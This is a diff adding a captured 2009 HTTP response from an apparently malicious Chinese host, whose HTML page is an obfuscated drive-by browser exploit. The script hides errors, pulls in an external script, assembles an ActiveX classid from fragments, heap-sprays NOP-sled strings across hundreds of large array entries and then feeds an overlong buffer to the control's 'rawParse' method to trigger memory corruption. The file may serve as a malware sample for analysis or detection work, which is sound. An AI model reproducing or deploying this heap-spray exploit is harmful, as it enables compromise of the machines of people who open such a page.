@@ -1,0 +1,57 @@
+HTTP/1.1 200 OK
+Content-Length: 1389
+ETag: "9e1b39bb62a1c91:299"
+Date: Thu, 12 Mar 2009 07:05:43 GMT
+Last-Modified: Tue, 10 Mar 2009 09:29:37 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Polipo-Location: http://kghytgv.cn:6135/Bfyy.htm
+X-Polipo-Date: Thu, 12 Mar 2009 07:13:43 GMT
+X-Polipo-Access: Thu, 12 Mar 2009 07:13:43 GMT
+
+<html>
+<body>
+<script>window.onerror=function(){return true;}</script>
+<script src=bf.js></script>
+<script language="JavaScript">
+var da212345="4f-A6E2-1"+"A85A9B4D9FB";
+var da21234="52E1D-E5"+"86-47";
+var da2123="clsi"+"d:6BE";
+duiniqmafbi=document.createElement("object");
+var da2123x=da2123+da21234+da212345;
+duiniqmafbi["setAttribute"]("classid", da2123x);
+var biniqmafbi = window["unescape"]("%u90"+"90"+"%u90"+"90");
+var iiniqmafbi;
+iiniqmafbi = 20;
+var isiniqmafbi;
+var snmbkab_syz;
+isiniqmafbi = iiniqmafbi+iBRDDDDDpkss1fgd["length"];
+while (biniqmafbi["length"]<isiniqmafbi) biniqmafbi+=biniqmafbi;
+ffiniqmafbibbiniqmafbi = biniqmafbi.substring(0, isiniqmafbi);
+bbiniqmafbi = biniqmafbi.substring(0, biniqmafbi["length"]-isiniqmafbi);
+while(bbiniqmafbi.length+isiniqmafbi<0x40000) bbiniqmafbi = bbiniqmafbi+bbiniqmafbi+ffiniqmafbibbiniqmafbi;
+iBRDpkss = new window["Array"]();
+dubabbsave = iBRDpkss;
+for (i=0; i<300; i++) dubabbsave[i] = bbiniqmafbi + iBRDDDDDpkss1fgd;
+var snmbkab = '';
+while (snmbkab["length"] < 4057) 
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+snmbkab+="\x0a";
+duiniqmafbi["rawParse"](snmbkab);
+</script>
+</body>
+</html>
